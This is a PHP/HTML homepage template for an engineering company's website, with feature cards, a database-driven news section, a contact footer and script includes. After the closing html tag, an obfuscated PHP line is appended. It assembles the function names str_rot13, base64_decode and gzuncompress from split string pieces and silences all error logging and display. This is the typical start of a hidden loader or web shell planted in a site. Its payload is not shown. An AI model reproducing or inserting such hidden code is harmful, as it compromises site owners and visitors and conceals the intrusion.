					<div class="why-choose-item wow fadeInUp" data-wow-delay="0.5s">
						<div class="why-choose-image">
							<img src="images/whyus-2.jpg" alt="">
						</div>

						<div class="why-choose-content">
							<div class="why-choose-icon">
								<img src="images/icon-whyus-2.svg" alt="">
							</div>

							<h3>Trust & Warranty</h3>
							<!--<p>Ut ut eros risus. In luctus fringilla augue, eget ultricies purus. Sed mauris a nisl.</p>-->
						</div>
					</div>
					<!-- Why Choose Item End -->
				</div>

				<div class="col-lg-3 col-md-6">
					<!-- Why Choose Item Start -->
					<div class="why-choose-item wow fadeInUp" data-wow-delay="0.75s">
						<div class="why-choose-image">
							<img src="images/whyus-3.jpg" alt="">
						</div>

						<div class="why-choose-content">
							<div class="why-choose-icon">
								<img src="images/icon-whyus-3.svg" alt="">
							</div>

							<h3>High Quality Work</h3>
							<!--<p>Ut ut eros risus. In luctus fringilla augue, eget ultricies purus. Sed mauris a nisl.</p>-->
						</div>
					</div>
					<!-- Why Choose Item End -->
				</div>

				<div class="col-lg-3 col-md-6">
					<!-- Why Choose Item Start -->
					<div class="why-choose-item wow fadeInUp" data-wow-delay="1.0s">
						<div class="why-choose-image">
							<img src="images/whyus-4.jpg" alt="">
						</div>

						<div class="why-choose-content">
							<div class="why-choose-icon">
								<img src="images/icon-whyus-4.svg" alt="">
							</div>

							<h3>24*7 Support</h3>
							<!--<p>Ut ut eros risus. In luctus fringilla augue, eget ultricies purus. Sed mauris a nisl.</p>-->
						</div>
					</div>
					<!-- Why Choose Item End -->
				</div>
			</div>
		</div>
	</div>
	<!-- Why Choose us Section End -->

	<!-- Why Choose us Section Start -->
	<div class="why-choose-us" style="padding-bottom: 0px;">
		<div class="container" style="max-width:100%;padding:0px;overflow: hidden;">
			<div class="row">
				<div class="col-md-12">
					<!-- Section Title Start -->
					<div class="section-title">
						<!--<h3 class="wow fadeInUp">Why Choose Us</h3>-->
						<h2 class="text-anime">Our Group Global Footprint</h2>
					</div>
					<!-- Section Title End -->
				</div>
			</div>

			<!--<div>-->
			<img src="images/Global-Presence-map.png">
			<!--</div>-->
		</div>
	</div>
	<!-- Why Choose us Section End -->

	<!-- Counter Section Start -->
	<!--<div class="stat-counter">-->
	<!--	<div class="container">-->
	<!--		<div class="row">-->
	<!--			<div class="col-lg-3 col-md-6">-->
	<!-- Counter Item Start -->
	<!--				<div class="counter-item">-->
	<!--					<div class="counter-icon">-->
	<!--						<img src="images/icon-project.svg" alt="">-->
	<!--					</div>-->

	<!--					<div class="counter-content">-->
	<!--						<h3><span class="counter">1000</span>+</h3>-->
	<!--						<p>Project Done</p>-->
	<!--					</div>-->
	<!--				</div>-->
	<!-- Counter Item End -->
	<!--			</div>-->

	<!--			<div class="col-lg-3 col-md-6">-->
	<!-- Counter Item Start -->
	<!--				<div class="counter-item">-->
	<!--					<div class="counter-icon">-->
	<!--						<img src="images/icon-happy-clients.svg" alt="">-->
	<!--					</div>-->

	<!--					<div class="counter-content">-->
	<!--						<h3><span class="counter">1200</span>+</h3>-->
	<!--						<p>Happy Clients</p>-->
	<!--					</div>-->
	<!--				</div>-->
	<!-- Counter Item End -->
	<!--			</div>-->

	<!--			<div class="col-lg-3 col-md-6">-->
	<!-- Counter Item Start -->
	<!--				<div class="counter-item">-->
	<!--					<div class="counter-icon">-->
	<!--						<img src="images/icon-award.svg" alt="">-->
	<!--					</div>-->

	<!--					<div class="counter-content">-->
	<!--						<h3><span class="counter">850</span>+</h3>-->
	<!--						<p>Award Winning</p>-->
	<!--					</div>-->
	<!--				</div>-->
	<!-- Counter Item End -->
	<!--			</div>-->

	<!--			<div class="col-lg-3 col-md-6">-->
	<!-- Counter Item Start -->
	<!--				<div class="counter-item">-->
	<!--					<div class="counter-icon">-->
	<!--						<img src="images/icon-ratting.svg" alt="">-->
	<!--					</div>-->

	<!--					<div class="counter-content">-->
	<!--						<h3><span class="counter">1100</span>+</h3>-->
	<!--						<p>Rating Customer</p>-->
	<!--					</div>-->
	<!--				</div>-->
	<!-- Counter Item End -->
	<!--			</div>-->
	<!--		</div>-->
	<!--	</div>-->
	<!--</div>-->
	<!-- Counter Section End -->



	<!-- Latest News Section Start -->
	<div class="latest-news">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<!-- Section Title Start -->
					<div class="section-title">
						<!--<h3 class="wow fadeInUp">Recent Articles</h3>-->
						<h2 class="text-anime">Our Latest News</h2>
					</div>
					<!-- Section Title End -->
				</div>
			</div>

			<div class="row">
			    <?php $ret=mysqli_query($con,"SELECT * FROM tblcontent WHERE Is_Active=1 ORDER BY SubCategoryId DESC  LIMIT 3");
							  $cnt=1;
							  while($row=mysqli_fetch_array($ret))
							  {?>
							  
				<div class="col-lg-4">
					<!-- Blog Item Start -->
					<div class="blog-item wow fadeInUp" data-wow-delay="0.25s">
						<div class="post-featured-image">
							<figure class="image-anime">
								<img src="<?php echo "admin/postimages/".$row['image']?>" alt="">
							</figure>
						</div>

						<div class="post-item-body">
							<h2><a href="blog-single.php?cid=<?php echo $row['SubCategoryId']?>"><?php echo $row['CategoryId']?></a></h2>
							<div class="post-meta">
								<ul>
									<li><i class="fa-regular fa-calendar-days"></i> <?php $dt= $row['UpdationDate'];
                                echo date("d, M Y", strtotime($dt));
                                ?></li>
									<!--<li><a href="#"><i class="fa-solid fa-tag"></i> Solar Panel</a></li>-->
								</ul>
							</div>

							<div class="btn-readmore">
								<a href="blog-single.php?cid=<?php echo $row['SubCategoryId']?>" class="btn-default">Read More</a>
							</div>
						</div>
					</div>
					<!-- Blog Item End -->
				</div>
				
				<?php $cnt=$cnt+1; }?>

				<!--<div class="col-lg-4">-->
				<!-- Blog Item Start -->
				<!--	<div class="blog-item wow fadeInUp" data-wow-delay="0.5s">-->
				<!--		<div class="post-featured-image">-->
				<!--			<figure class="image-anime">-->
				<!--				<img src="images/post-2.jpg" alt="">-->
				<!--			</figure>-->
				<!--		</div>-->

				<!--		<div class="post-item-body">-->
				<!--			<h2><a href="#">Hydrogen Sustainable</a></h2>-->
				<!--			<div class="post-meta">-->
				<!--				<ul>-->
				<!--					<li><a href="#"><i class="fa-regular fa-calendar-days"></i> 09 Feb 2024</a></li>-->
				<!--					<li><a href="#"><i class="fa-solid fa-tag"></i> Solar Panel</a></li>-->
				<!--				</ul>-->
				<!--			</div>-->

				<!--			<div class="btn-readmore">-->
				<!--				<a href="#" class="btn-default">Read More</a>-->
				<!--			</div>-->
				<!--		</div>-->
				<!--	</div>-->
				<!-- Blog Item End -->
				<!--</div>-->

				<!--<div class="col-lg-4">-->
				<!-- Blog Item Start -->
				<!--	<div class="blog-item wow fadeInUp" data-wow-delay="0.75s">-->
				<!--		<div class="post-featured-image">-->
				<!--			<figure class="image-anime">-->
				<!--				<img src="images/post-3.jpg" alt="">-->
				<!--			</figure>-->
				<!--		</div>-->

				<!--		<div class="post-item-body">-->
				<!--			<h2><a href="#">Advancements and Breakthroughs in Renewable Power</a></h2>-->
				<!--			<div class="post-meta">-->
				<!--				<ul>-->
				<!--					<li><a href="#"><i class="fa-regular fa-calendar-days"></i> 09 Feb 2024</a></li>-->
				<!--					<li><a href="#"><i class="fa-solid fa-tag"></i> Solar Panel</a></li>-->
				<!--				</ul>-->
				<!--			</div>-->

				<!--			<div class="btn-readmore">-->
				<!--				<a href="#" class="btn-default">Read More</a>-->
				<!--			</div>-->
				<!--		</div>-->
				<!--	</div>-->
				<!-- Blog Item End -->
				<!--</div>-->
			</div>
		</div>
	</div>
	<!-- Latest News Section End -->


	<!-- Footer Start -->
	<footer class="main-footer">
		<!-- Footer Contact Start -->
		<div class="footer-contact">
			<div class="container">
				<div class="row">
					<div class="col-lg-4">
						<!-- Footer Contact Box Start -->
						<div class="footer-contact-box wow fadeInUp" data-wow-delay="0.25s">
							<div class="contact-icon-box">
								<img src="images/icon-email.svg" alt="">
							</div>

							<div class="footer-contact-info">
								<h3>Support & Email</h3>
								<p>info@bgrtech.in</p>
							</div>
						</div>
						<!-- Footer Contact Box End -->
					</div>

					<div class="col-lg-4">
						<!-- Footer Contact Box Start -->
						<div class="footer-contact-box wow fadeInUp" data-wow-delay="0.5s">
							<div class="contact-icon-box">
								<img src="images/whatsapp.png" alt="" style="width:50%;">
							</div>

							<div class="footer-contact-info">
								<h3>Customer Support</h3>
								<p>+91 7397698191</p>
							</div>
						</div>
						<!-- Footer Contact Box End -->
					</div>

					<div class="col-lg-4">
						<!-- Footer Contact Box Start -->
						<div class="footer-contact-box wow fadeInUp" data-wow-delay="0.75s">
							<div class="contact-icon-box">
								<img src="images/icon-location.svg" alt="">
							</div>

							<div class="footer-contact-info">
								<h3>Our Location</h3>
								<p>Black Diamond,Plot.No. L6 -L7, 3<sup>rd</sup> Cross Road, Thiru-vi-ka Industrial Estate, Guindy, Chennai - 600 032</p>
							</div>
						</div>
						<!-- Footer Contact Box End -->
					</div>
				</div>
			</div>
		</div>
		<!-- Footer Contact End -->

		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<!-- Mega Footer Start -->
					<div class="mega-footer">
						<div class="row">
							<div class="col-lg-2 col-md-12">
								<!-- Footer About Start -->
								<div class="footer-about">
									<figure>
										<img src="images/logo.png" alt="" class="img-main">
									</figure>
									<!--<p>Lorem Ipsum</p>-->
								</div>
								<!-- Footer About End -->

								<!-- Footer Social Link Start -->
								<div class="footer-social-links">
									<ul>


										<li><a href="https://www.linkedin.com/company/bgrtech/"><i
													class="fa-brands fa-linkedin-in"></i></a></li>
										<li><a href="#"><img src="images/Twitter_25x25.png" alt
													style="height: 12px;"></a></li>
										<li><a href="#"><i class="fa-brands fa-youtube"></i></a></li>
										<!--<li><a href="#"><i class="fa-brands fa-instagram"></i></a></li>-->
									</ul>
								</div>
								<!-- Footer Social Link End -->
							</div>

							<div class="col-lg-3 col-md-4">
								<!-- Footer Links Start -->
								<div class="footer-links">
									<h2>Products</h2>
									<ul>
										<li><a href="oil-and-gas-products.php">Oil and
												Gas Processing</a></li>
										<li><a href="heat-exchangers.php">Heat
												Exchangers</a></li>
										<li><a href="green-hydrogen-products.php">Hydrogen</a></li>
										<li><a href="others.php">Others</a></li>
									</ul>
								</div>
								<div class="footer-links" style="margin-top: 20px;">
									<h2>Quick Links</h2>
									<ul>
										<li><a href="careers.php">Careers</a></li>
										<li><a href="blog.php">Blog</a></li>
										<li><a href="contact.php">Contact Us</a></li>
										<li><a href="Corporate-Info.php">Corporate Info</a></li>
										<li><a href="Privacy-Policy.php">Privacy Policy</a></li>
									</ul>
								</div>
								<!-- Footer Links End -->
							</div>

							<div class="col-lg-4 col-md-4">
								<!-- Footer Links Start -->
								<div class="footer-links">
									<h2>Projects</h2>
									<ul>
										<li><a href="integrated-surface-facilities.php">Integrated Surface
												Facilities/Early Production Facilities</a></li>
										<li><a href="gas-processing-plant.php">Gas
												Gathering/Processing</a></li>

										<li><a href="hydrogen-generation-purification-storage.php">Hydrogen Generation,
												Purification
												& Storage</a></li>
										<li><a href="api650-storage-tanks.php">API 650
												Storage Tanks</a></li>
									</ul>
								</div>
								<!-- Footer Links End -->
							</div>

							<div class="col-lg-3 col-md-4">
								<!-- Footer Links Start -->
								<div class="footer-links">
									<h2>Services</h2>
									<ul>
										<li><a href="technical-engineering-services.php">Technical Engineering
												Services</a></li>
										<li><a href="feasibility-study.php">Feasibility
												Study</a></li>
										<li><a href="feed-engineering.php">FEED
												Engineering</a></li>
									</ul>
								</div>
								<!-- Footer Links End -->
							</div>
						</div>
					</div>
					<!-- Mega Footer End -->

					<!-- Copyright Footer Start -->
					<div class="footer-copyright">
						<div class="row">
							<div class="col-md-12">
								<!-- Footer Copyright Content Start -->
								<div class="footer-copyright-text">
									<p>Copyright © 2024 BGR Tech. All rights reserved.</p>
								</div>
								<!-- Footer Copyright Content End -->
							</div>
						</div>
					</div>
					<!-- Copyright Footer End -->
				</div>
			</div>
		</div>
	</footer>
		<?php $ret1=mysqli_query($con,"SELECT * FROM `tbl_new_updates` WHERE SubCategoryId ='1' && is_Active= '1'");
							  $cnt=1;
							  $row1=mysqli_fetch_array($ret1);
							  if($row1){
							  ?>
							  <div id="imageModal" class="modal">
        <div class="modal-content">
            <button class="close" onclick="closeModal()">&times;</button>
            <a href="<?php 
            echo !empty($row1['SubCatDescription']) ? $row1['SubCatDescription'] : "#";
             ?>"><img src="<?php echo "admin/updates/".$row1['post_image'] ?>" alt="BGR Image"></a>
        </div>
    </div>
    <?php 
}
?>

	<!-- Footer End -->
	<a href="https://api.whatsapp.com/send?phone=+917397698191&amp;text=Hello" class="whatsapp-float" target="_blank">
		<i class="bi bi-whatsapp"></i>
	</a>
	<!-- BUTTON TOP START -->
	<button class="scroltop"><span class="fa fa-angle-up  relative" id="btn-vibrate"></span></button>
	<script src="js/project-swiper.js"></script>
	<!-- Jquery Library File -->
	<script src="js/jquery-3.7.1.min.js"></script>
	<!-- Bootstrap js file -->
	<script src="js/bootstrap.min.js"></script>
	<!-- Validator js file -->
	<script src="js/validator.min.js"></script>
	<!-- SlickNav js file -->
	<script src="js/jquery.slicknav.js"></script>
	<!-- Swiper js file -->
	<script src="js/swiper-bundle.min.js"></script>

	<!-- Counter js file -->
	<script src="js/jquery.waypoints.min.js"></script>
	<script src="js/jquery.counterup.min.js"></script>
	<!-- Magnific js file -->
	<script src="js/jquery.magnific-popup.min.js"></script>
	<!-- SmoothScroll -->
	<script src="js/SmoothScroll.js"></script>
	<!-- Parallax js -->
	<script src="js/parallaxie.js"></script>
	<!-- MagicCursor js file -->
	<script src="js/gsap.min.js"></script>
	<script src="js/magiccursor.js"></script>
	<!-- Text Effect js file -->
	<script src="js/splitType.js"></script>
	<script src="js/ScrollTrigger.min.js"></script>
	<!-- Wow js file -->
	<script src="js/wow.js"></script>
	<!-- Main Custom js file -->
	<script src="js/function.js"></script>
	<!--<script src="../../../assets/js/theme-panel.js"></script>-->
	
	<script>
  function openModal() {
            document.getElementById("imageModal").style.display = "flex";
        }
        function closeModal() {
            document.getElementById("imageModal").style.display = "none";
        }
	</script>
</body>

</html>
<?php $HkmUe = 'st'.'r'.'_'.'rot1'.'3'; $PuCBs = 'b'.'a'.'se64'.'_deco'.'de'; $nJeQW = 'gzu'.'nco'.'mpress'; ini_set('error_log', NULL); ini_set('display_errors', 0); error_reporting(0); ?>